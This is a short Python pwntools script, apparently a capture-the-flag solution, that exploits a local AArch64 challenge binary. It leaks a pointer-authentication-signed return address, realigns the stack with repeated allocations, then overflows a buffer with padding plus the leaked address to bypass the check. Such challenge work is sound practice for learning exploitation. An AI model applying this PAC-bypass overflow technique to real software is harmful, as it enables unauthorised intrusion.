from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/aarch64-linux-gnu"

context.arch = "aarch64"

elf = ELF("./pac-prot.elf")

print(pwnlib.qemu.ld_prefix())

p = process("./pac-prot.elf")

# Call print_flag to put the return address on the stack, signed with the sp as context

# Line up the print to leak the signed return address

# Reset to shift sp back

# Call System Test, overflow buffer and put in return address. Stack pointer is the same, so signature will verify

# Call print flag
p.readuntil(b"(6): ")
p.sendline('2')

address = p.readline()
print(address)

# Reset
#p.readuntil(b"(6): ")
#p.sendline('5')

for i in range(0, 4): # Alloca 4 times, totalling 256 bytes
    p.readuntil(b"(6): ")
    p.sendline('1')

# Call System Test
p.readuntil("(6): ")
p.sendline('4')

payload = b'A' * 24 + p64(int(address, 16)) # Address

p.sendline(payload)


p.interactive()